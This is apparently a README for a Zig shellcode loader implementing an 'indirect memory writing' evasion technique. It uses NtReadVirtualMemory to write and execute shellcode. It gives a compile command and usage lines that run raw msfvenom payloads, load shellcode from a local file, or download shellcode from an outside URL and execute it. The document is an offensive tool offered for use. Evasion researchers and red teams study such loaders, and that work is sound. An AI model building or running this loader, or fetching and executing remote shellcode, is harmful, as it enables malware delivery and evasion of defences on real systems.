# Indirect Memory Writing

- **Technique**: [Indirect-Memory-Writing](https://unprotect.it/technique/indirect-memory-writing/)

Uses `NtReadVirtualMemory` to directly write memory and execute shellcode.

- Zig version: 0.15.2

**Compile:**
```
zig build-exe -lc -dynamic -fstrip -target x86_64-windows -O ReleaseFast src/indirect_shellcode.zig
```

**Usage:**
```
indirect_shellcode.exe -s "\xde\xad\xbe\xef" # Use msfvenom with -f raw
indirect_shellcode.exe -u "https://uauth.io/shellcode.bin"
indirect_shellcode.exe -f "C:\Windows\temp\shellcode.bin"
```
